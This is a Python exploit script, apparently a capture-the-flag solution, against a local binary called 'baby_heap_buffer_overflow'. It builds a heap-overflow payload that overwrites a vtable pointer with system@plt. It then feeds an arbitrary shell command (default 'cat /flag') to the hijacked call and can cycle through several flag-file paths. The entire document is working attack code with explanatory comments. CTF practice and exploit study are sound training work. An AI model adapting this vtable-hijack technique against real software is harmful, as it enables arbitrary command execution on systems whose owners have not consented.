#!/usr/bin/env python3
import argparse
import struct
import subprocess
from pathlib import Path

BIN_PATH = Path(__file__).resolve().parent / "exe"
LD_LINUX = "/lib64/ld-linux-x86-64.so.2"

READ_NAME = 0x400877
SYSTEM_PLT = 0x400730


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


def build_payload() -> bytes:
    # object->content is 0x40 bytes, but fgets reads up to 0x63 bytes (+ '\0').
    # This overflows into the next heap chunk (vtable) and rewrites function pointers.
    return b"A" * 0x50 + p64(READ_NAME) + p64(SYSTEM_PLT)


def spawn_target() -> list[str]:
    if BIN_PATH.exists() and BIN_PATH.stat().st_mode & 0o111:
        return [str(BIN_PATH)]

    # Fallback for this repo: binary may not have executable bit checked in.
    return [LD_LINUX, str(BIN_PATH)]


def run_once(command: str, timeout: int = 5) -> str:
    payload = build_payload()
    script = b""
    script += b"1\n" + payload + b"\n"           # overwrite vtable->write = system@plt
    script += b"1\n" + command.encode() + b"\n"   # store shell command into object->content
    script += b"2\n"                               # call system(object->content)
    script += b"3\n"                               # exit (may abort due heap metadata corruption)

    proc = subprocess.run(
        spawn_target(),
        input=script,
        cwd=str(BIN_PATH.parent),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
        timeout=timeout,
    )
    return proc.stdout.decode("latin1", errors="ignore")


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit baby_heap_buffer_overflow")
    parser.add_argument(
        "--cmd",
        default="cat /flag",
        help="command executed by hijacked system(object->content)",
    )
    parser.add_argument(
        "--try-common-flags",
        action="store_true",
        help="try several common flag paths until one returns content",
    )
    args = parser.parse_args()

    if args.try_common_flags:
        for cmd in [
            "cat /flag",
            "cat /flag.txt",
            "cat flag",
            "cat ./flag",
            "cat /home/ctf/flag",
        ]:
            print(f"[+] trying: {cmd}")
            out = run_once(cmd)
            print(out)
            if "No such file or directory" not in out and "cannot open" not in out:
                break
        return

    print(run_once(args.cmd))


if __name__ == "__main__":
    main()
